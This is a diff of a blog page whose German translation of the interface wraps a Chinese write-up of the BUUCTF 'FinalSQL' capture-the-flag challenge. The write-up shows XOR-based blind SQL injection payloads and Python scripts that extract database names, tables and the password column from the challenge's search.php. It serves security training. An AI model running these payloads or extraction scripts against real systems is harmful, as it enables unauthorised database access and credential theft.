@@ -10,12 +10,12 @@
 <title>2.16 [极客大挑战 2019]FinalSQL - Da4er&#39;s Blogs</title>
 
 
-    <meta name="description" content="检测通过测试发现在search.php页面存在sql注入。1234561^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 1^(ord(substr((select(group_concat(tab">
+    <meta name="description" content="检测通过测试发现在search.php页面存在sql注入。 1234561^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 1^(ord(substr((select(group_concat(ta">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2.16 [极客大挑战 2019]FinalSQL">
 <meta property="og:url" content="https://da4er.top/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL.html">
 <meta property="og:site_name" content="Da4er&#39;s Blogs">
-<meta property="og:description" content="检测通过测试发现在search.php页面存在sql注入。1234561^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 1^(ord(substr((select(group_concat(tab">
+<meta property="og:description" content="检测通过测试发现在search.php页面存在sql注入。 1234561^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 1^(ord(substr((select(group_concat(ta">
 <meta property="og:image" content="https://da4er.top/images/og_image.png">
 <meta property="article:published_time" content="2020-02-16T12:28:37.000Z">
 <meta property="article:modified_time" content="2020-02-16T12:29:07.413Z">
@@ -120,7 +120,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Suche" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -149,7 +149,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 minutes read (About 531 words)
+                    4 minutes lesen (Über 531 Worte)
                 </span>
                 
                 
@@ -162,7 +162,14 @@
             
         </h1>
         <div class="content">
-            <p>检测通过测试发现在search.php页面存在sql注入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure><br>先写个判断数据库名的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure><br>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure><br><img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er"></p>
+            <p>检测通过测试发现在search.php页面存在sql注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库名称 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables) where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库表名 </span><br><span class="line"></span><br><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.column s)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&#x3D;%d)^1&quot;%(i,ord(j)) 获取数据库列名</span><br></pre></td></tr></table></figure>
+<p>先写个判断数据库名的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line">def database_len():</span><br><span class="line">    for i in range(9999):</span><br><span class="line">        url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">        payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length(database())&gt;%s&#39;&#39;&#39; %i</span><br><span class="line">        #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">        r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">        if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">            print(i)</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;database_length:&#39;,i)</span><br><span class="line">            break</span><br><span class="line">#database_len()</span><br><span class="line">def database_name():</span><br><span class="line">    databasename&#x3D;&#39;&#39;</span><br><span class="line">    for i in range(1,9):</span><br><span class="line">        for j in &#39;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;:</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and substr(database(),%d,1) &#x3D; &#39;%s&#39; &#39;&#39;&#39; %(i,j)</span><br><span class="line">            #print(url+payload+&#39; --+ &#39;)</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~&#39; in r.text:</span><br><span class="line">                databasename +&#x3D; j</span><br><span class="line">                print(databasename)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;database_name:&quot;,databasename.lower())</span><br><span class="line">#database_name()</span><br><span class="line">def table_length():</span><br><span class="line">        for j in range(9999):</span><br><span class="line">            url&#x3D;&#39;&#39;&#39;http:&#x2F;&#x2F;e383c445-91e1-4760-ae8f-4b889943e40c.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#39;&#39;&#39;</span><br><span class="line">            payload&#x3D;&#39;&#39;&#39;?id&#x3D;1&#39;^and length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1))&gt;%s&#39;&#39;&#39; %j</span><br><span class="line">            r&#x3D;requests.get(url+payload+&#39; --+ &#39;)</span><br><span class="line">            if &#39;NO! Not this! Click others~~~ in r.text:</span><br><span class="line">                print(j)</span><br><span class="line">            else:</span><br><span class="line">                print(&#39;firs table length:&#39;,j)</span><br><span class="line">                break</span><br><span class="line">table_length()</span><br></pre></td></tr></table></figure>
+<p>判断表名和字段名的可以依葫芦画瓢，来写脚本。<br>最终的脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#然后是二分法，二分法要快很多：</span><br><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"> </span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;5dbbc107-a871-4d45-940a-3b2712330fee.node3.buuoj.cn&#x2F;search.php&quot;</span><br><span class="line">flag &#x3D; &#39;&#39;</span><br><span class="line">def payload(i,j):</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #数据库名字          </span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;%d)^1&quot;%(i,j)           #表名</span><br><span class="line">    # sql &#x3D; &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;%d)^1&quot;%(i,j)        #列名</span><br><span class="line">    sql &#x3D; &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;%(i,j)</span><br><span class="line">    data &#x3D; &#123;&quot;id&quot;:sql&#125;</span><br><span class="line">    r &#x3D; requests.get(url,params&#x3D;data)</span><br><span class="line">    # print (r.url)</span><br><span class="line">    if &quot;Click&quot; in r.text:</span><br><span class="line">        res &#x3D; 1</span><br><span class="line">    else:</span><br><span class="line">        res &#x3D; 0</span><br><span class="line"> </span><br><span class="line">    return res</span><br><span class="line"> </span><br><span class="line">def exp():</span><br><span class="line">    global flag</span><br><span class="line">    for i in range(1,10000) :</span><br><span class="line">        print(i,&#39;:&#39;)</span><br><span class="line">        low &#x3D; 31</span><br><span class="line">        high &#x3D; 127</span><br><span class="line">        while low &lt;&#x3D; high :</span><br><span class="line">            mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class="line">            res &#x3D; payload(i,mid)</span><br><span class="line">            if res :</span><br><span class="line">                low &#x3D; mid + 1</span><br><span class="line">            else :</span><br><span class="line">                high &#x3D; mid - 1</span><br><span class="line">        f &#x3D; int((low + high + 1)) &#x2F;&#x2F; 2</span><br><span class="line">        if (f &#x3D;&#x3D; 127 or f &#x3D;&#x3D; 31):</span><br><span class="line">            break</span><br><span class="line">        # print (f)</span><br><span class="line">        flag +&#x3D; chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(&#39;flag&#x3D;&#39;,flag)</span><br></pre></td></tr></table></figure>
+<img src="/2-16-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-FinalSQL/1.png" class title="Da4er">
+
 
         </div>
         
@@ -184,7 +191,7 @@
 
 <div class="card">
     <div class="card-content">
-        <h3 class="menu-label has-text-centered">Like this article? Support the author with</h3>
+        <h3 class="menu-label has-text-centered">Gefällt Ihnen der Artikel? Unterstützen Sie den Autor mit</h3>
         <div class="buttons is-centered">
             
                 
@@ -289,7 +296,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Kategorien
             </h3>
             <ul class="menu-list">
             <li>
@@ -419,7 +426,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -444,7 +451,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -473,7 +480,7 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -578,7 +585,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -746,7 +753,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Kategorien
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -771,7 +778,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                Folgen</a>
         </div>
         
         
@@ -800,7 +807,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Letzte Einträge
         </h3>
         
         <article class="media">
@@ -905,7 +912,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archive
         </h3>
         <ul class="menu-list">
         
@@ -1154,7 +1161,7 @@ document.addEventListener('DOMContentLoaded', function () {
 </script>
 
 
-<a id="back-to-top" title="Back to Top" href="javascript:;">
+<a id="back-to-top" title="Zurück nach oben" href="javascript:;">
     <i class="fas fa-chevron-up"></i>
 </a>
 <script src="/js/back-to-top.js" defer></script>
@@ -1178,7 +1185,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Tippen Sie etwas..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1191,10 +1198,10 @@ document.addEventListener('DOMContentLoaded', function () {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
                 POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
+                PAGES: 'Seiten',
+                CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Unbenannt)',
             },
             CONTENT_URL: '/content.json',
         };
